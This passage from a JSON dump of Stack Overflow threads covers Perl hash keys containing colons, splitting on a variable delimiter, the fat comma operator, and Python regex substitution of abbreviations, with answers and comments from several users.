61763644, "body": "solved it already thanks for the help JENS"}, {"owner": {"reputation": 62184, "user_id": 7231, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/81b76985f3985e35492e25880493d045?s=128&d=identicon&r=PG", "display_name": "Dave Cross", "link": "https://stackoverflow.com/users/7231/dave-cross"}, "edited": false, "score": 0, "creation_date": 1462785524, "post_id": 37109330, "comment_id": 61765368, "body": "Your title is misleading. There are no arrays in your data."}, {"owner": {"reputation": 21782, "user_id": 176646, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/HsQyV.png?s=128&g=1", "display_name": "ThisSuitIsBlackNot", "link": "https://stackoverflow.com/users/176646/thissuitisblacknot"}, "edited": false, "score": 0, "creation_date": 1462803272, "post_id": 37109330, "comment_id": 61777196, "body": "Please don&#39;t edit the word &quot;SOLVED&quot; into your question titles. If you want to indicate that your problem is solved, you can do it by clicking the green checkbox next to the answer that helped you most. If you solve a problem by yourself, you can write your own answer and accept it."}], "answers": [{"comments": [{"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "edited": false, "score": 0, "creation_date": 1462777192, "post_id": 37109423, "comment_id": 61760837, "body": "tried this print $data-&gt;{&quot;SOAP:Body&quot;}-&gt;{&quot;ns1:MT_DF_AssetMaster_Response&quot;}-&gt;{A&zwnj;&#8203;SSETCREATED}-&gt;{ASSET&zwnj;&#8203;}.&quot;\\n&quot;; but always getting HASH(0x1f8b6e0) as response."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462778299, "post_id": 37109423, "comment_id": 61761428, "body": "<i>&quot;You should also remove the &quot; &quot; around the variable name in your print statement. The hashref-dereferencing doesn&#39;t work otherwise&quot;</i> That just  isn&#39;t true"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "edited": false, "score": 0, "creation_date": 1462786011, "post_id": 37109423, "comment_id": 61765670, "body": "@vher: Your <code>{ASSET}</code> contains a hash ref, you might want to check <code>scalar keys %{$data-&gt;{&quot;SOAP:Body&quot;}-&gt;{&quot;ns1:MT_DF_AssetMaster_Response&quot;}-&gt;&zwnj;&#8203;{ASSETCREATED}-&gt;{ASS&zwnj;&#8203;ET\u200c\u200b}}</code> which will return the number of keys (0 = no keys)."}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": -1, "last_activity_date": 1462776713, "creation_date": 1462776713, "answer_id": 37109423, "question_id": 37109330, "link": "https://stackoverflow.com/questions/37109330/why-do-i-get-a-syntax-error-when-i-try-to-print-a-nested-hash-that-has-keys-cont/37109423#37109423", "title": "Why do I get a syntax error when I try to print a nested hash that has keys containing colons?", "body": "<p><code>SOAP:Body</code> must be quoted: The <code>:</code> may not be used without quoting as hash key:</p>\n\n<pre><code>print $data-&gt;{'SOAP:Body'}-&gt;{'ns1:MT_DF_AssetMaster_Response'}\n</code></pre>\n\n<p>You should also remove the <code>\" \"</code> around the variable name in your print statement. The hashref-dereferencing doesn't work otherwise. Your output would be something like</p>\n\n<pre><code>HASH(0x123456)-&gt;{SOAP:Body}-&gt;{ns1:MT_DF_AssetMaster_Response}\n</code></pre>\n\n<p>...but you may still have another error if line 85 isn't the <code>print</code> command.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": true, "score": 0, "last_activity_date": 1462778506, "creation_date": 1462778506, "answer_id": 37109866, "question_id": 37109330, "link": "https://stackoverflow.com/questions/37109330/why-do-i-get-a-syntax-error-when-i-try-to-print-a-nested-hash-that-has-keys-cont/37109866#37109866", "title": "Why do I get a syntax error when I try to print a nested hash that has keys containing colons?", "body": "<p>You must write something like this</p>\n\n<pre><code>my $asset = $data-&gt;{'SOAP:Body'}{'ns1:MT_DF_AssetMaster_Response'}{ASSETCREATED}{ASSET};\n\nprint %$asset ? \"Asset is NOT empty\\n\" : \"Asset is empty\\n\";\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "is_accepted": false, "score": 0, "last_activity_date": 1462803471, "creation_date": 1462803471, "answer_id": 37118136, "question_id": 37109330, "link": "https://stackoverflow.com/questions/37109330/why-do-i-get-a-syntax-error-when-i-try-to-print-a-nested-hash-that-has-keys-cont/37118136#37118136", "title": "Why do I get a syntax error when I try to print a nested hash that has keys containing colons?", "body": "<p>The following are the syntaxes for a hash lookup via reference:</p>\n\n<pre><code>REF-&gt;{IDENTIFIER}\nREF-&gt;{EXPR}\n</code></pre>\n\n<p><code>ns1:MT_DF_AssetMaster_Response</code> is neither a valid identifier, nor a valid expression. Replace</p>\n\n<pre><code>-&gt;{ns1:MT_DF_AssetMaster_Response}\n</code></pre>\n\n<p>with</p>\n\n<pre><code>-&gt;{'ns1:MT_DF_AssetMaster_Response'}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 121105, "user_id": 2766176, "user_type": "registered", "accept_rate": 61, "profile_image": "https://www.gravatar.com/avatar/edd8638efe875601bfe394a8aea5b16d?s=128&d=identicon&r=PG", "display_name": "brian d foy", "link": "https://stackoverflow.com/users/2766176/brian-d-foy"}, "is_accepted": false, "score": 0, "last_activity_date": 1462885475, "creation_date": 1462885475, "answer_id": 37139424, "question_id": 37109330, "link": "https://stackoverflow.com/questions/37109330/why-do-i-get-a-syntax-error-when-i-try-to-print-a-nested-hash-that-has-keys-cont/37139424#37139424", "title": "Why do I get a syntax error when I try to print a nested hash that has keys containing colons?", "body": "<p>Perl allows an expression inside the subscripts for an array or a hash. For instance, a variable:</p>\n\n<pre><code>$array[ $i ]\n</code></pre>\n\n<p>Or the result of an addition:</p>\n\n<pre><code>$array[ $i + $offset ]\n</code></pre>\n\n<p>Or something </p>\n\n<pre><code>$array[ cos( $i ) ]\n</code></pre>\n\n<p>It's the same with a hash:</p>\n\n<pre><code>$hash{ $key }\n</code></pre>\n\n<p>The dot is still the string concatenation operator:</p>\n\n<pre><code>$hash{ $key . $prefix }\n</code></pre>\n\n<p>It's harder to spot when you have barewords smooshed together:</p>\n\n<pre><code>$hash{first.last}\n</code></pre>\n\n<p>And in this case, the : is still part of the namespace separator. Perl thinks you aren't done with this expression in the braces so it complains:</p>\n\n<pre><code>$hash{ SOAP:Body }   # !!! Error\n</code></pre>\n"}], "owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 86, "favorite_count": 0, "accepted_answer_id": 37109866, "answer_count": 4, "score": 0, "last_activity_date": 1462885475, "creation_date": 1462776397, "last_edit_date": 1462803117, "question_id": 37109330, "link": "https://stackoverflow.com/questions/37109330/why-do-i-get-a-syntax-error-when-i-try-to-print-a-nested-hash-that-has-keys-cont", "title": "Why do I get a syntax error when I try to print a nested hash that has keys containing colons?", "body": "<p>I'm trying to print an element of a nested data structure:</p>\n\n<pre><code>$VAR1 = {\n  'SOAP:Body' =&gt; {\n     'ns1:MT_DF_AssetMaster_Response' =&gt; {\n       'SUBNUMBER' =&gt; {},\n       'ASSETCREATED' =&gt; {\n                         'SUBNUMBER' =&gt; {},\n                         'ASSET' =&gt; {},\n                         'COMPANYCODE' =&gt; {}\n                       },\n       'RETURN' =&gt; {\n                   'PARAMETER' =&gt; 'timedependentdata',\n                   'MESSAGE_V2' =&gt; {},\n                   'ID' =&gt; 'BAPI1022',\n                   'MESSAGE_V1' =&gt; 'HW5790',\n                   'ROW' =&gt; '0',\n                   'TYPE' =&gt; 'E',\n                   'FIELD' =&gt; 'plate_no',\n                   'LOG_NO' =&gt; {},\n                   'MESSAGE_V3' =&gt; {},\n                   'SYSTEM' =&gt; 'xxx',\n                   'MESSAGE' =&gt; 'Invalid date transferred for field xxx:',\n                   'MESSAGE_V4' =&gt; {},\n                   'NUMBER' =&gt; '041',\n                   'LOG_MSG_NO' =&gt; '000000'\n                 },\n       'xmlns:ns1' =&gt; 'urn:ariba.com:xi:OnDemand:Asset',\n       'ASSET' =&gt; {},\n       'COMPANYCODE' =&gt; {}\n     }\n   },\n  'xmlns:SOAP' =&gt; 'http://schemas.xmlsoap.org/soap/envelope/',\n  'SOAP:Header' =&gt; {}\n};\n\nprint \"$data-&gt;{SOAP:Body}-&gt;{ns1:MT_DF_AssetMaster_Response}-&gt;{ASSETCREATED}=&gt;{ASSET}\\n\";\n</code></pre>\n\n<p>But I get a syntax error:</p>\n\n<blockquote>\n  <p>syntax error at ./asset_creation.pl line 85, near \"{SOAP:\"</p>\n</blockquote>\n\n<p>How can I fix this?</p>\n"}, {"tags": ["perl", "split"], "comments": [{"owner": {"reputation": 110113, "user_id": 168657, "user_type": "registered", "accept_rate": 92, "profile_image": "https://www.gravatar.com/avatar/f14e7610fca39322ebbf23530def15f8?s=128&d=identicon&r=PG", "display_name": "mob", "link": "https://stackoverflow.com/users/168657/mob"}, "edited": false, "score": 1, "creation_date": 1462773448, "post_id": 37108514, "comment_id": 61759144, "body": "If your delimiter is <code>\\s</code> or <code>|</code>, you will need to escape the command-line arguments in the shell. How are you running your program? Print out <code>$fs1</code> to make sure it is getting to the perl executable correctly."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462773799, "post_id": 37108514, "comment_id": 61759281, "body": "It&#39;s always wise to explain what you mean by <i>&quot;does not work&quot;</i>. On its own that is of no help at all"}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1462773408, "post_id": 37108586, "comment_id": 61759125, "body": "You <i>don&#39;t</i> need <code>\\E</code> to end the escaping. It simply continues until the end of the pattern if unspecified"}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": -2, "last_activity_date": 1462773454, "last_edit_date": 1462773454, "creation_date": 1462773341, "answer_id": 37108586, "question_id": 37108514, "link": "https://stackoverflow.com/questions/37108514/perl-split-on-any-delimitter/37108586#37108586", "title": "Perl split on any delimitter", "body": "<p><code>\\Q</code> is the beginning of quoting, you should have <code>\\E</code> to end the quoting:</p>\n\n<pre><code>@temp = split(/\\Q$fs1\\E/, $row1);\n</code></pre>\n\n<p>To see what's happening there, you could try <code>quotemeta</code>. It does exactly the same as <code>\\Q ... \\E</code>:</p>\n\n<pre><code>print quotemeta($fs1);\n</code></pre>\n\n<p>This will work if <code>$fs1</code> is anything like letters, numbers or RegEx special chars, maybe a <code>+</code> or <code>*</code>.</p>\n\n<p>If you want to pass RegEx specials, remove the <code>\\Q</code>:</p>\n\n<pre><code>@temp = split(/$fs1/, $row1);\n</code></pre>\n\n<p>Now <code>$fs1</code> may contain, for example, <code>\\s</code> to split at any space-like char or <code>a+</code> to split at any number of <code>a</code> letters.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 0, "last_activity_date": 1467562964, "last_edit_date": 1467562964, "creation_date": 1462773732, "answer_id": 37108693, "question_id": 37108514, "link": "https://stackoverflow.com/questions/37108514/perl-split-on-any-delimitter/37108693#37108693", "title": "Perl split on any delimitter", "body": "<p>Your code works fine as long as you don't specify any regex metacharacters</p>\n\n<pre><code>use strict;\nuse warnings 'all';\n\nmy $fs1 = ':=';\n\nmy $row1 = 'a:=b:=c:=d:=e';\n\nmy @fields = split /\\Q$fs1/, $row1;\n\nuse Data::Dump;\ndd \\@fields;\n</code></pre>\n\n<h3>output</h3>\n\n<pre><code>[\"a\" .. \"e\"]\n</code></pre>\n\n<p>The only problem I can think of is that, if you specify something like <code>\\s</code> then the <code>\\Q</code> will escape it so that you will be splitting on the two characters backslash followed by <code>s</code> instead of a whitespace character. Perhaps you just need to remove the <code>\\Q</code>? But then you would have to escape characters like square brackets, braces, pipes etc. on the input line</p>\n"}], "owner": {"reputation": 139, "user_id": 3605217, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EHW2p.jpg?s=128&g=1", "display_name": "Curious", "link": "https://stackoverflow.com/users/3605217/curious"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 69, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1467562964, "creation_date": 1462772990, "last_edit_date": 1462774680, "question_id": 37108514, "link": "https://stackoverflow.com/questions/37108514/perl-split-on-any-delimitter", "title": "Perl split on any delimitter", "body": "<p>How do i split a line with a variable as a delimiter. Variable can be anything example\n<code>:</code> <code>,</code> <code>\\s</code> <code>|</code> <code>.</code> or any word.</p>\n\n<p>Tried this:</p>\n\n<pre><code>GetOptions (\n    'f1=s' =&gt; \\$file1,\n    \"fs1=s\" =&gt; \\$fs1\n);\n\nopen(fh1, $file1);\n\nwhile(my $row1 = &lt;fh1&gt;) {\n    chomp $row1;\n    @temp=split(/\\Q$fs1/, $row1);\n}\n</code></pre>\n\n<p>but this does not work. I am taking <code>$fs1</code> (file seperator) as input from user.</p>\n"}, {"tags": ["perl"], "comments": [{"owner": {"reputation": 320771, "user_id": 589924, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/b2cf53d5a3d25f95c0db4e025aed4153?s=128&d=identicon&r=PG", "display_name": "ikegami", "link": "https://stackoverflow.com/users/589924/ikegami"}, "edited": false, "score": 1, "creation_date": 1462808961, "post_id": 37108247, "comment_id": 61781150, "body": "Note: People frequently say that <code>=&gt;</code> quotes the <i>bareword</i> on its LHS, but it&#39;s impossible for a bareword to appear on the LHS of <code>=&gt;</code>. They mean that <code>=&gt;</code> quotes the <i>identifier</i> on its LHS."}], "answers": [{"comments": [{"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1462773220, "post_id": 37108437, "comment_id": 61759049, "body": "An array is <i>not</i> a list. Please take a look at <a href=\"http://perldoc.perl.org/perlfaq4.html#What-is-the-difference-between-a-list-and-an-array%3F\" rel=\"nofollow noreferrer\"><i>What is the difference between a list and an array?</i></a> in <code>perldoc perlfaq4</code>"}, {"owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "reply_to_user": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 0, "creation_date": 1462773595, "post_id": 37108437, "comment_id": 61759201, "body": "No, it isn&#39;t. But here it&#39;s both: A <i>list</i> of values stored into an <i>array</i>. That&#39;s why I used both keywords."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 1, "creation_date": 1462774186, "post_id": 37108437, "comment_id": 61759432, "body": "So why don&#39;t you write that? <i>&quot;list (array)&quot;</i> implies that the two words are synonymous (they&#39;re not keywords)."}], "tags": [], "owner": {"reputation": 2298, "user_id": 1147230, "user_type": "registered", "accept_rate": 80, "profile_image": "https://www.gravatar.com/avatar/fe33f45c5990a98cfcb1388581de07af?s=128&d=identicon&r=PG", "display_name": "Sebastian", "link": "https://stackoverflow.com/users/1147230/sebastian"}, "is_accepted": false, "score": 0, "last_activity_date": 1462772572, "creation_date": 1462772572, "answer_id": 37108437, "question_id": 37108247, "link": "https://stackoverflow.com/questions/37108247/what-does-module-represent-when-invoking-the-subroutine-not-in-file-ok/37108437#37108437", "title": "What does &quot;$module =&gt;&quot; represent when invoking the subroutine &quot;not_in_file_ok&quot;", "body": "<p><code>=&gt;</code> is the <em>fat comma</em>. It's basically another way of writing a <code>,</code>, but using it makes comma-separated-lists more obvious to the reader. Compare these:</p>\n\n<pre><code>%a = (\n    a =&gt; 1,\n    b =&gt; 2,\n    c =&gt; 3,\n);\n%b = (\"a\", 1, \"b\", 2, \"c\", 3,);\n</code></pre>\n\n<p>The left side of the fat comma <code>=&gt;</code> is assumed to be text.</p>\n\n<p>I'd write your sub call as</p>\n\n<pre><code>not_in_file_ok ( $module,\n 'the great new $MODULENAME'    =&gt; qr /- The great new/,\n  'boilerplate description'     =&gt; qr /Quick Summary of what themodule/,\n  'stub function definition'     =&gt; qr /function[12]/,\n);\n</code></pre>\n\n<p>to visually separate the <code>$module</code> argument from the remaining list.</p>\n\n<p>This is working, because a Perl hash could be converted to a list (array) and back at any </p>\n\n<pre><code>@array1 = %hash1;\n%hash2 = @array1;\n</code></pre>\n\n<p>The list/array representation of a hash is just a list of keys and values: key1, value1, key2, value2, etc. That's what you're passing as arguments to the sub.</p>\n\n<p>The first line of the sub takes one argument of (into <code>$filename</code>) and creates a hash out of the remaining ones:</p>\n\n<pre><code>    my ($filename, %regex)= @_;\n</code></pre>\n\n<p>The second line tries to open the first argument:</p>\n\n<pre><code>    open (my $fh, '&lt;',  $filename)\n</code></pre>\n\n<p>I assume it should be a filename. No matter if it's called <code>$module</code> or followed by a fat or thin/normal comma.</p>\n\n<p>See <a href=\"http://perldoc.perl.org/perlop.html#Comma-Operator\" rel=\"nofollow\">http://perldoc.perl.org/perlop.html#Comma-Operator</a> for more information.</p>\n"}, {"tags": [], "owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "is_accepted": false, "score": 2, "last_activity_date": 1462772869, "creation_date": 1462772869, "answer_id": 37108486, "question_id": 37108247, "link": "https://stackoverflow.com/questions/37108247/what-does-module-represent-when-invoking-the-subroutine-not-in-file-ok/37108486#37108486", "title": "What does &quot;$module =&gt;&quot; represent when invoking the subroutine &quot;not_in_file_ok&quot;", "body": "<p>The <code>=&gt;</code> operator is known as the <em>fat comma</em> and is basically a comma. It has the added facility that if its left-hand parameter is a \"bareword\" (composed entirely of ASCII letters and digits and the underscore) then it will be implicitly quoted, for example <code>field1 =&gt; 99</code> is the same as <code>'field1', 99</code>, but that doesn't apply in this case because <code>$module</code> is not a bareword. It also implies some sort of relationship between its left and right parameters, which is why it is often used in hash initialisation to separate the key and value of a hash element</p>\n\n<p>It is documented in <a href=\"http://perldoc.perl.org/perlop.html#Comma-Operator\" rel=\"nofollow\">perldoc perlop</a></p>\n\n<p>Your code is <em>identical</em> to this</p>\n\n<pre><code>not_in_file_ok ( $module,\n    'the great new $MODULENAME'    =&gt; qr/- The great new/,\n    'boilerplate description'      =&gt; qr/Quick Summary of what themodule/,\n    'stub function definition'     =&gt; qr/function[12]/,\n);\n</code></pre>\n\n<p>and in my opinion should be written that way. The <code>=&gt;</code> doesn't have any advantages here, and it seems that the author was trying to be clever</p>\n"}], "owner": {"reputation": 21, "user_id": 6284462, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/bf878fbda054a327ad7bae149853472b?s=128&d=identicon&r=PG&f=1", "display_name": "ting", "link": "https://stackoverflow.com/users/6284462/ting"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 38, "favorite_count": 0, "answer_count": 2, "score": 2, "last_activity_date": 1462772869, "creation_date": 1462771608, "last_edit_date": 1462772567, "question_id": 37108247, "link": "https://stackoverflow.com/questions/37108247/what-does-module-represent-when-invoking-the-subroutine-not-in-file-ok", "title": "What does &quot;$module =&gt;&quot; represent when invoking the subroutine &quot;not_in_file_ok&quot;", "body": "<pre><code>#! /usr/bin/perl\nuse warnings;\nuse strict;\n\nuse Test::More tests =&gt; 6;\n\nsub not_in_file_ok {\n    my ($filename, %regex)= @_;\n\n    open (my $fh, '&lt;',  $filename)\n            or die \"couldn't open $filename for reading: $!\";\n\n    my %violated;\n\n    while (my $line = &lt;$fh&gt;) {\n        while ( my ($desc, $regex) = each %regex ) {\n            if ( $line =~ $regex ) {\n                push @{$violated{$desc}||=[] }, $.;\n            }\n        }\n    }\n\n    if ( %violated ) {\n        fail(\"$filename contains boilerplate test\");\n        diag \"$_ appears on lines @{$violated{$_}}\" for  keys %violated;\n    }\n    else {\n        pass (\"$filename contains no boilerplate test\");\n    }\n}\n</code></pre>\n\n<p>now start to invoke the function above</p>\n\n<pre><code>sub module_boilerplate_ok  {\n    my ($module ) = @_;\n\n    not_in_file_ok ( $module =&gt;\n        'the great new $MODULENAME'    =&gt; qr/- The great new/,\n        'boilerplate description'      =&gt; qr/Quick Summary of what themodule/,\n        'stub function definition'     =&gt; qr/function[12]/,\n    );\n }\n</code></pre>\n\n<p>My question is that the first parameter should be a \"file\" for the subroutine <code>not_in_file_ok</code>. Can <code>$module =&gt;</code> represent a file? I think <code>$module =&gt;</code> seems to be a key of a hash because it is using <code>=&gt;</code>. who can help me understand the parameter?</p>\n"}, {"tags": ["python", "regex", "perl"], "comments": [{"owner": {"reputation": 159902, "user_id": 3297613, "user_type": "registered", "accept_rate": 74, "profile_image": "https://i.stack.imgur.com/KHhzd.jpg?s=128&g=1", "display_name": "Avinash Raj", "link": "https://stackoverflow.com/users/3297613/avinash-raj"}, "edited": false, "score": 0, "creation_date": 1462770903, "post_id": 37107967, "comment_id": 61758285, "body": "try with this pattern <code>pattern = r&#39;\\b&#39; + re.escape(abbr) + r&#39;(?=\\s)&#39;</code>"}], "answers": [{"comments": [{"owner": {"reputation": 29, "user_id": 2178732, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/9fd52767ad20d1d5163b6d4c7e04221a?s=128&d=identicon&r=PG", "display_name": "Tathagat Nawadia", "link": "https://stackoverflow.com/users/2178732/tathagat-nawadia"}, "edited": false, "score": 0, "creation_date": 1462778297, "post_id": 37108066, "comment_id": 61761426, "body": "I tried both the solution, your worked too. Thanks :)"}], "tags": [], "owner": {"reputation": 343, "user_id": 5934150, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ef54b37e8f12bf6cd0ad79c7cb3a3018?s=128&d=identicon&r=PG&f=1", "display_name": "takoika", "link": "https://stackoverflow.com/users/5934150/takoika"}, "is_accepted": false, "score": 0, "last_activity_date": 1462770789, "last_edit_date": 1462770789, "creation_date": 1462770480, "answer_id": 37108066, "question_id": 37107967, "link": "https://stackoverflow.com/questions/37107967/combine-whole-word-substitution-with-regex-character-in-python/37108066#37108066", "title": "Combine whole word substitution with Regex character in Python", "body": "<p>A importance thing is the order of <code>corrections.items()</code>. In this case <code>corrections.items()</code> yield <code>L.C.M</code> then <code>L.C.M.</code>, which is not desiarable order. My solution is to check items of <code>corrections</code> with reverse dictionary order. The reverse dictionary order yield <code>L.C.M.</code> then <code>L.C.M</code>. To do this, replace</p>\n\n<pre><code>for abbr,replace in corrections.items():\n</code></pre>\n\n<p>with</p>\n\n<pre><code>rev_dict_items = sorted(list(corrections.items()))\nrev_dict_items.reverse()\nfor abbr,replace in rev_dict_items:\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 15076, "user_id": 2549021, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/vHZn6.png?s=128&g=1", "display_name": "AKS", "link": "https://stackoverflow.com/users/2549021/aks"}, "is_accepted": false, "score": 0, "last_activity_date": 1462771053, "creation_date": 1462771053, "answer_id": 37108154, "question_id": 37107967, "link": "https://stackoverflow.com/questions/37107967/combine-whole-word-substitution-with-regex-character-in-python/37108154#37108154", "title": "Combine whole word substitution with Regex character in Python", "body": "<p>The problem lies here in matching <code>L.C.M.</code> since it is followed by a dot and you are also applying word boundary using <code>\\b</code>. Word boundary won't match the last dot <code>(.)</code> because it is not followed by any alphanumeric character.</p>\n\n<p>If you want to make sure that the string you want to match is not followed by a non-whitespace character, you could do it like following:</p>\n\n<p><a href=\"https://regex101.com/r/nZ5cK6/1\" rel=\"nofollow\"><strong><code>\\b(L\\.C\\.M\\.)(?!\\S)</code></strong></a></p>\n\n<p><code>(?!\\S)</code> here will make sure that your matching string is not followed by non-whitespace character. So it will match if there is a space afterwards or if it is the end of the string.</p>\n\n<p><a href=\"https://ideone.com/0bjiDi\" rel=\"nofollow\"><strong>IDEONE DEMO</strong></a></p>\n"}], "owner": {"reputation": 29, "user_id": 2178732, "user_type": "registered", "accept_rate": 25, "profile_image": "https://www.gravatar.com/avatar/9fd52767ad20d1d5163b6d4c7e04221a?s=128&d=identicon&r=PG", "display_name": "Tathagat Nawadia", "link": "https://stackoverflow.com/users/2178732/tathagat-nawadia"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 100, "favorite_count": 0, "answer_count": 2, "score": 1, "last_activity_date": 1462771053, "creation_date": 1462769797, "question_id": 37107967, "link": "https://stackoverflow.com/questions/37107967/combine-whole-word-substitution-with-regex-character-in-python", "title": "Combine whole word substitution with Regex character in Python", "body": "<p>So i have a dictionary like this : </p>\n\n<pre><code>corrections = {'L.C.M.':'LCM','L.C.M':'LCM'}\nsometext = 'L.C.M is cool but L.C.M. is not L.C.Mwhichshouldnotchange'\nexpected = 'LCM is cool but LCM is not L.C.Mwhichshouldnotchange'\n</code></pre>\n\n<p>I need to do replace the 1st and 2nd to LCM, so i write this code</p>\n\n<pre><code>for abbr,replace in corrections.items():\n    pattern = r'\\b' + re.escape(abbr) + r'\\b'\n    sometext = re.sub(pattern, replace, sometext)\n</code></pre>\n\n<p>This code is somewhat working but </p>\n\n<pre><code>L.C.M. -&gt; (Apply 1st replacement) -&gt; LCM. (which is wrong)\nL.C.M. -&gt; (Apply 2nd replacement) -&gt; LCM  (right)\n</code></pre>\n\n<p>I need a fool proof  replacement code because i have a big list of abbreviations to substitute </p>\n"}, {"tags": ["xml", "perl"], "comments": [{"owner": {"reputation": 31, "user_id": 3712604, "user_type": "registered", "accept_rate": 43, "profile_image": "https://www.gravatar.com/avatar/318f462b361d16d2cb8e6451a1bacff8?s=128&d=identicon&r=PG&f=1", "display_name": "vher", "link": "https://stackoverflow.com/users/3712604/vher"}, "edited": false, "score": 0, "creation_date": 1462768312, "post_id": 37107589, "comment_id": 61757560, "body": "solve it already hahaha."}, {"owner": {"reputation": 123805, "user_id": 622310, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/8b6d35219e1808520bc238b28161e2e6?s=128&d=identicon&r=PG", "display_name": "Borodin", "link": "https://stackoverflow.com/users/622310/borodin"}, "edited": false, "score": 2, "creation_date": 1462769334, "post_id": 37107589, "comment_id": 61757805, "body": "If you have a solution then you should post it as an answer below. Also, <i>please</i> don&#39;t use <code>XML::Simple</code>: <a 